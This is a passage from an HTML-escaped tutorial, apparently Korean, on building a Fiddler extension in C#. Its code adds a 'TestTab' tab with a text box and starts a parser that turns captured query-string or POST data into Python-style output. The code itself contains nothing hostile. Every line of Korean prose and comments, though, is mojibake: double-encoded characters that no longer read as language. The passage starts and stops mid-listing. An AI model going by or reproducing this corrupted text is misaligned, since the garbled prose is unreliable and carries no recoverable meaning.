    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê·¸ë¦¬ê³  Fiddler Extension ê°œë°œì„ ìœ„í•´ &lt;code class=&quot;highlighter-rouge&quot;&gt;IFiddlerExtension&lt;/code&gt; í´ë˜ìŠ¤ë¥¼ ìƒì†ë°›ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// IFiddlerExtension ì›í˜•&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Fiddler&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IFiddlerExtension&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnBeforeUnload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnLoad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IFiddlerExtension&lt;/code&gt; ëŠ” ì¸í„°í˜ì´ìŠ¤ë¡œ ì„ ì–¸ë˜ì–´ìˆê¸° ë•Œë¬¸ì— &lt;code class=&quot;highlighter-rouge&quot;&gt;OnLoad()&lt;/code&gt; ì™€ &lt;code class=&quot;highlighter-rouge&quot;&gt;OnBeforeUnload()&lt;/code&gt; ë¥¼ êµ¬í˜„í•´ì£¼ì–´ì•¼ë§Œ í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;ClassLibrary2&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IFiddlerExtension&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;TabPage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnLoad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;TabPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TestTab&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;FiddlerApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tabsViews&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TabPages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnBeforeUnload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/sun0705.png&quot; alt=&quot;/assets/sun0705.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ê·¸ë¦¬ê³  &lt;code class=&quot;highlighter-rouge&quot;&gt;System.Windows.Forms&lt;/code&gt; í´ë˜ìŠ¤ì˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;TabPage&lt;/code&gt; ì»´í¬ë„ŒíŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ìŠ¤í„´ìŠ¤ë¥¼ ìƒì„±í•´ì£¼ê³ , &lt;code class=&quot;highlighter-rouge&quot;&gt;FiddlerApplication.UI.tabsViews.TabPages.Add&lt;/code&gt; ë©”ì†Œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ë“±ë¡í•´ì£¼ë©´ ìœ„ì™€ ê°™ì´ Fiddlerì— &lt;code class=&quot;highlighter-rouge&quot;&gt;TestTab&lt;/code&gt; ì´ë¼ëŠ” ì´ë¦„ì˜ íƒ­ì´ ìƒì„±ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IFiddlerExtension&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;TabPage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;TextBox&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnLoad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;TabPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TestTab&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;TextBox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Multiline&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AcceptsTab&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AutoSize&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AllowDrop&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadOnly&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ScrollBars&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ScrollBars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Both&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Dock&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DockStyle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Controls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;FiddlerApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tabsViews&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TabPages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnBeforeUnload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/sun0706.png&quot; alt=&quot;/assets/sun0706.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;íƒ­ ë‚´ì— UIë¥¼ ì ì ˆíˆ êµ¬ì„±í•œ ë’¤, ì•ì„œ ë§Œë“¤ì–´ë†“ì€ &lt;code class=&quot;highlighter-rouge&quot;&gt;page&lt;/code&gt; ì¸ìŠ¤í„´ìŠ¤ì— ìˆëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;Page.Controls.Add&lt;/code&gt; ë©”ì†Œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ êµ¬ì„±í•œ UI ì¸ìŠ¤í„´ìŠ¤ë¥¼ ë“±ë¡í•´ì£¼ë©´ ìœ„ì™€ ê°™ì´ í™”ë©´ì„ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;4-ì†ŒìŠ¤ì½”ë“œ&quot;&gt;4. ì†ŒìŠ¤ì½”ë“œ&lt;/h1&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Windows.Forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Fiddler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;assembly&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Fiddler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;RequiredVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2.2.8.6&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Test&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Test&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IFiddlerExtension&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TabPage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TextBox&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;textbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;// QueryString / POST Data íŒŒì‹±&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parseData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ampIdx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IndexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'&amp;amp;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;queryStrings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;data = {\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ampIdx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;queryStrings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'&amp;amp;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;queryString&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;queryStrings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;equalsIdx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;queryString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IndexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;equalsIdx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyValue&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;queryString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
						&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\t\&quot;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\&quot;: \&quot;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;\&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%22&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\&quot;,\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
					&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;equalsIdx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IndexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;equalsIdx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyValue&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\t\&quot;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\&quot;: \&quot;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;\&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%22&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\&quot;,\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;}\r\n\r\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;// ì¸ìë¡œ ë°›ì•„ì˜¨ ì„¸ì…˜ ë°ì´í„°ì—ì„œ&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// í•„ìš”í•œ ìš”ì†Œ ì¶”ì¶œí•˜ì—¬ Python ì½”ë“œë¡œ ë³€í™˜&lt;/span&gt;
